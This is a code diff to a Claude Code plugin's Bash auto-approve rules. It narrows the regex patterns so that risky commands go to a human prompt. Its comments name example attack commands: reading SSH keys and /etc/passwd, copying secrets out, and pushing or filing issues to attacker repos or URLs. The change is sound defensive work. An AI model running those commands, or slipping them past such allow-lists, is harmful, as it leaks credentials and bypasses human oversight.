@@ -41,19 +41,38 @@ const _nodeToolRule = process.env.CLAUDE_PLUGIN_ROOT
   ? `node ${process.env.CLAUDE_PLUGIN_ROOT}/tools/*`
   : 'node ~/.claude/plugins/cache/forge/forge/*/tools/*';
 
+// SECURITY (issue #43 / forge-engineering #42): these patterns auto-approve a
+// Bash command with NO prompt. A non-match falls through to Claude Code's normal
+// permission flow (the human is asked) — it does NOT block. So the rule is:
+// auto-allow ONLY shapes that are unambiguously in-tree Forge workflow steps,
+// and let anything that could read a secret, exfiltrate, or execute foreign code
+// fall through to a prompt. Patterns are anchored to their argument shape, not a
+// bare command prefix, precisely so `cat ~/.ssh/id_rsa`, `cp <secret> /tmp/x`,
+// `gh issue create -R attacker/repo`, `git push https://attacker/…`, and
+// `node /tmp/evil/tools/x.cjs` are NOT auto-approved.
 const BASH_PATTERNS = [
-  // Node tool invocations — covers $FORGE_ROOT/tools/*.cjs and $CLAUDE_PLUGIN_ROOT
+  // Node tool invocations — only when the directory before /tools/ is a trusted
+  // Forge root: $FORGE_ROOT / $CLAUDE_PLUGIN_ROOT, the plugin cache, or a path
+  // ending in /.forge. `node /tmp/evil/tools/x.cjs` does NOT match.
   // (H-5d: rule is dynamically built from CLAUDE_PLUGIN_ROOT when set)
-  { pattern: /^node\s+.*\/tools\/[\w-]+\.(cjs|js)\b/, rule: _nodeToolRule },
+  {
+    pattern:
+      /^node\s+(?:"?\$(?:CLAUDE_PLUGIN_ROOT|FORGE_ROOT)"?|\S*\/\.claude\/plugins\/cache\/forge\/\S*|\S*\/\.forge)\/tools\/[\w-]+\.(?:cjs|js)\b/,
+    rule: _nodeToolRule,
+  },
   // NOTE: node -e and node -p removed — arbitrary code execution must not be auto-approved.
   // Forge workflows use node .../tools/*.cjs for tool invocations; inline node -e/p requires
   // explicit user approval each time.
   // Shell commands used by Forge workflows
   { pattern: /^mkdir\s+-p\s+/, rule: 'mkdir -p .forge/*' },
   { pattern: /^mkdir\s+-p\s+\S+/, rule: 'mkdir -p .forge/*' },
-  { pattern: /^cp\s+/, rule: 'cp */schemas/*.schema.json .forge/schemas/' },
+  // cp only when the destination (last arg) is under .forge/ — copying a secret
+  // out to an arbitrary location is not auto-approved.
+  { pattern: /^cp\s+\S.*\s\.?\/?\.forge\/\S*\s*$/, rule: 'cp */schemas/*.schema.json .forge/schemas/' },
   { pattern: /^ls\s+/, rule: 'ls *' },
-  { pattern: /^cat\s+/, rule: 'cat .forge/*' },
+  // cat only within .forge/ or engineering/ — reading arbitrary files (e.g.
+  // ~/.ssh/id_rsa, /etc/passwd) falls through to a prompt.
+  { pattern: /^cat\s+(?:-\S+\s+)*\.?\/?(?:\.forge|engineering)\//, rule: 'cat .forge/*' },
   { pattern: /^date\s+-u\s+/, rule: 'date -u *' },
   { pattern: /^date\s+/, rule: 'date -u *' },
   { pattern: /^jq\s+/, rule: 'jq *' },
@@ -63,14 +82,18 @@ const BASH_PATTERNS = [
   { pattern: /^rm\s+-rf\s+\.forge/, rule: 'rm -rf .forge/*' },
   { pattern: /^rmdir\s+/, rule: 'rmdir .forge/*' },
   { pattern: /^gh\s+auth\s+/, rule: 'gh auth status *' },
-  { pattern: /^gh\s+issue\s+/, rule: 'gh issue create *' },
+  // gh issue only against the current repo — a -R/--repo pointing at a foreign
+  // repo (cross-repo exfiltration) is not auto-approved.
+  { pattern: /^gh\s+issue\s+(?!.*(?:\s-R\b|\s--repo\b))/, rule: 'gh issue create *' },
   // git read-only commands (already auto-approved by Claude Code, but belt-and-suspenders)
   { pattern: /^git\s+status\b/, rule: 'git status *' },
   { pattern: /^git\s+log\b/, rule: 'git log *' },
   { pattern: /^git\s+diff\b/, rule: 'git diff *' },
   { pattern: /^git\s+add\s+/, rule: 'git add *' },
   { pattern: /^git\s+commit\s+-m\s+/, rule: 'git commit -m *' },
-  { pattern: /^git\s+push\b/, rule: 'git push *' },
+  // git push only to a named remote — pushing to an explicit attacker URL
+  // (http(s)/ssh/git/file) is not auto-approved.
+  { pattern: /^git\s+push\b(?!.*(?:https?:\/\/|git@|ssh:\/\/|file:\/\/))/, rule: 'git push *' },
   { pattern: /^git\s+checkout\s+/, rule: 'git checkout *' },
   { pattern: /^git\s+branch\s+/, rule: 'git branch *' },
   { pattern: /^git\s+stash\b/, rule: 'git stash *' },
